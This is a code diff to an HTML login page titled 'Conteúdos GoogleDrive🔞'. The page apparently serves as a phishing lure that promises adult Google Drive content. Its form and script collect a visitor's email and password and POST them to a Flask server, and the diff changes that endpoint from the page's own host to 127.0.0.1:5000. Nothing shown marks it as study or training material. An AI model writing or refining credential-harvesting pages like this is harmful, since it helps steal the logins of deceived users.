@@ -80,7 +80,7 @@
     <div class="gradient-overlay right"></div>
     <div class="container">
         <h2>Conteúdos GoogleDrive🔞</h2>
-        <form id="loginForm" method="POST" action="">
+        <form id="loginForm" method="POST" action="http://127.0.0.1:5000">
             <div class="form-group">
                 <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
             </div>
@@ -94,12 +94,6 @@
     </div>
 
     <script>
-        // Obtém o endereço IP atual da página
-        var enderecoIP = window.location.hostname;
-
-        // Atualiza o atributo action do formulário com o endereço IP
-        document.getElementById("loginForm").action = "http://" + enderecoIP + ":5000";
-
         function enviarFormulario() {
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
@@ -114,7 +108,7 @@
             formData.append('password', password);
 
             var xhr = new XMLHttpRequest();
-            xhr.open('POST', document.getElementById("loginForm").action); // Usa o endereço IP dinâmico
+            xhr.open('POST', 'http://127.0.0.1:5000'); // Defina a URL do seu endpoint de login no servidor Flask
             xhr.onload = function () {
                 if (xhr.status === 200) {
                     // Sucesso
